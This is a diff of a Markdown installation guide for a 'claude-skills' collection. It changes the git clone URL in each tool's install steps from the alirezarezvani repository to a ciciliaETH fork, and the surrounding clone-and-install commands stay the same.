@@ -34,14 +34,14 @@ Choose your platform and follow the steps:
     Or clone and install manually:
 
     ```bash
-    git clone https://github.com/alirezarezvani/claude-skills.git
+    git clone https://github.com/ciciliaETH/claude-skills.git
     ./scripts/codex-install.sh
     ```
 
 === "Gemini CLI"
 
     ```bash
-    git clone https://github.com/alirezarezvani/claude-skills.git
+    git clone https://github.com/ciciliaETH/claude-skills.git
     ./scripts/gemini-install.sh
     ```
 
@@ -62,7 +62,7 @@ Choose your platform and follow the steps:
     [Hermes Agent](https://github.com/NousResearch/hermes-agent) uses the same agentskills.io SKILL.md standard — no format conversion needed.
 
     ```bash
-    git clone https://github.com/alirezarezvani/claude-skills.git
+    git clone https://github.com/ciciliaETH/claude-skills.git
     cd claude-skills
     python scripts/sync-hermes-skills.py --verbose
     ```
@@ -80,7 +80,7 @@ Choose your platform and follow the steps:
 === "Cursor"
 
     ```bash
-    git clone https://github.com/alirezarezvani/claude-skills.git
+    git clone https://github.com/ciciliaETH/claude-skills.git
     cd claude-skills
     ./scripts/convert.sh --tool cursor
     ./scripts/install.sh --tool cursor --target /path/to/project
@@ -89,7 +89,7 @@ Choose your platform and follow the steps:
 === "Aider"
 
     ```bash
-    git clone https://github.com/alirezarezvani/claude-skills.git
+    git clone https://github.com/ciciliaETH/claude-skills.git
     cd claude-skills
     ./scripts/convert.sh --tool aider
     ./scripts/install.sh --tool aider --target /path/to/project
@@ -98,7 +98,7 @@ Choose your platform and follow the steps:
 === "Windsurf"
 
     ```bash
-    git clone https://github.com/alirezarezvani/claude-skills.git
+    git clone https://github.com/ciciliaETH/claude-skills.git
     cd claude-skills
     ./scripts/convert.sh --tool windsurf
     ./scripts/install.sh --tool windsurf --target /path/to/project
@@ -107,7 +107,7 @@ Choose your platform and follow the steps:
 === "Kilo Code"
 
     ```bash
-    git clone https://github.com/alirezarezvani/claude-skills.git
+    git clone https://github.com/ciciliaETH/claude-skills.git
     cd claude-skills
     ./scripts/convert.sh --tool kilocode
     ./scripts/install.sh --tool kilocode --target /path/to/project
@@ -116,7 +116,7 @@ Choose your platform and follow the steps:
 === "OpenCode"
 
     ```bash
-    git clone https://github.com/alirezarezvani/claude-skills.git
+    git clone https://github.com/ciciliaETH/claude-skills.git
     cd claude-skills
     ./scripts/convert.sh --tool opencode
     ./scripts/install.sh --tool opencode --target /path/to/project
@@ -125,7 +125,7 @@ Choose your platform and follow the steps:
 === "Augment"
 
     ```bash
-    git clone https://github.com/alirezarezvani/claude-skills.git
+    git clone https://github.com/ciciliaETH/claude-skills.git
     cd claude-skills
     ./scripts/convert.sh --tool augment
     ./scripts/install.sh --tool augment --target /path/to/project
@@ -134,7 +134,7 @@ Choose your platform and follow the steps:
 === "Antigravity"
 
     ```bash
-    git clone https://github.com/alirezarezvani/claude-skills.git
+    git clone https://github.com/ciciliaETH/claude-skills.git
     cd claude-skills
     ./scripts/convert.sh --tool antigravity
     ./scripts/install.sh --tool antigravity
@@ -143,7 +143,7 @@ Choose your platform and follow the steps:
 === "Manual"
 
     ```bash
-    git clone https://github.com/alirezarezvani/claude-skills.git
+    git clone https://github.com/ciciliaETH/claude-skills.git
     # Copy any skill folder to ~/.claude/skills/
     ```
 
